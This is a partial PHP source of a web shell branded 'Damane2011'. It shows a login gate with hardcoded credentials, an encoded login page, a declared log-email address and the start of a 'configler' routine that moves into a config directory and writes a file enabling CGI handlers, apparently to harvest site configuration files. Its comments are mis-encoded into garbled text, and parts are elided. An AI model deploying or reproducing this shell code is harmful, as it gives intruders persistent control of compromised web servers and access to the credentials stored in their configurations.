...
error_reporting(0);
$HTC= '';  
$HTC_auth = 1; // ≈–« √—œ   ‘€Ì· «·Ãœ«— «·‰«—Ì ›√Ã⁄·Â« 1 
$name='814989b983fd853fb374e1676a06ade4';// Â‰« «”„ «·„” Œœ„ ··Ãœ«— «·‰«—Ì Ê»≈„ﬂ«‰ﬂ  €ÌÌ—Â
$pass='814989b983fd853fb374e1676a06ade4';// Â‰« ﬂ·„… «·„——Ê ··Ãœ«— «·‰«—Ì Ê»≈„ﬂ«‰ﬂ  €ÌÌ—Â«
if($HTC_auth == 1) {
if (!isset($_SERVER['PHP_AUTH_USER']) || md5($_SERVER['PHP_AUTH_USER'])!==$name || md5($_SERVER['PHP_AUTH_PW'])!==$pass)
   {
   header('WWW-Authenticate: Basic realm=System Damane2011 "HELLO!"');
   header('HTTP/1.0 401 Unauthorized');
   exit("<b>Sorry the User 0r Password Error!!</b>");
   }
}
$HTC_login = 1; // ≈–« √—œ   ‘€Ì· «”„ «·„” Œœ„ + ﬂ·„… «·„—Ê— »’Ê—… ⁄«œÌ… ›√Ã⁄·Â« 1
$user = 'police'; // Â‰« «”„ «·„” Œœ„ Ê»≈„ﬂ«‰ﬂ  €Ì—Â
$pass = 'police';    //Â‰« ﬂ·„… «·„—Ê— Ê»≈„ﬂ«‰ﬂ  €ÌÌ—Â« 
if ($HTC_login ==1){
if($_COOKIE["user"] != $user or $_COOKIE["pass"] != md5($pass)){
if($_POST[usrname]==$user and $_POST[passwrd]==$pass){
	print'<script>document.cookie="user='.$_POST[usrname].';";document.cookie="pass='.md5($_POST[passwrd]).';";alert("You Have  Logged Successfully :) To Shell [Damane2011] ")</script>';
}else{
	if($_POST[usrname]){print'<script>alert("Error Password Or UserName")</script>';}
echo'<script>
<!--
document.write(unescape("%3Cbody%20bgcolor%3D%23000000%3E%0A%3Ctitle%3ELogin%20Shell%20To%20Damane%20DZ%3C/title%3E%0A%3Cp%20align%3D%22center%22%3E%3Cfont%20face%3DTahoma%20color%3D%22%2300FFFF%22%20size%3D%224%22%3EShell%Damane%202011%20DZ%3C/font%3E%20%3Cbr%3E%3Cfont%20color%3D%22%23FF9933%22size%3D%224%22%3E%20%3Cu%3ELogin%3A%3C/u%3E%20%3C/font%3E%3C/p%3E%0A%3Cdiv%20align%3D%22center%22%3E%0A%3Cform%20name%3D%22fr%22%20action%3D%22%22%20method%3D%22POST%22%20onsubmit%3D%22if%28this.usrname.value%3D%3D%5C%27%5C%27%29%7Breturn%20false%3B%7D%22%3E%3Cfont%20face%3D%22Andalus%22color%3D%22%2300FF00%22%20size%3D%224%22%3EUserName%3A%3C/font%3E%3Cbr%3E%0A%3Cinput%20name%3D%22usrname%22%20type%3D%22text%22%20value%3D%22UserName%22%20%20size%3D%2230%22%20onfocus%3D%22if%20%28this.value%20%3D%3D%20%5C%27UserName%5C%27%29%7Bthis.value%20%3D%20%5C%27%5C%27%3B%7D%22/%3E%3Cbr%3E%3Cfont%20face%3D%22Andalus%22color%3D%22%2300FF00%22%20size%3D%224%22%3EPassWord%3A%3C/font%3E%3Cbr%3E%20%3Cinput%20name%3D%22passwrd%22%20type%3D%22password%22%20value%3D%22PassWord%22%20size%3D%2230%22%20onfocus%3D%22if%20%28this.value%20%3D%3D%20%5C%27PassWord%5C%27%29%20this.value%20%3D%20%5C%27%5C%27%3B%22%20/%3E%3Cbr%3E%3Cfont%20face%3Dpristina%20color%3D%22%23008000%22%20size%3D%224%22%3E%0A%3Cinput%20type%3D%22submit%22%20value%3D%22%20%20Login%20%20%22%20/%3E%0A%3C/form%3E%3C/p%3E"));
//-->
</script>';
exit;
}
...
$sh_id = "Q3JlYXRlZCBCeSBEQU1BTkUyMDExIA0KRW1haWw6IERhbWFuZS1EekBob3RtYWlsLkNvTU==";
$sh_ver = "";
$sh_name = base64_decode($sh_id).$sh_ver;
$sh_mainurl = "WwW.Damane-Dz.Net";
$html_start = ''.
'<html><head>
...
$tmpdir = ""; 
$tmpdir_log = "./";
$log_email = "Damane-Dz@hotmail.Com"; //email untuk pengiriman log.
...
$damane = '<b><center>-|Created By Damane2011 Email:Damane-Dz@hotmail.com |-</center></b>';
...
if ($act == "configler") {
    ...
    chdir('config');
        ...
        $metin = "";    
		 ...
		 $metin = "AddHandler cgi-script .dam
Options all
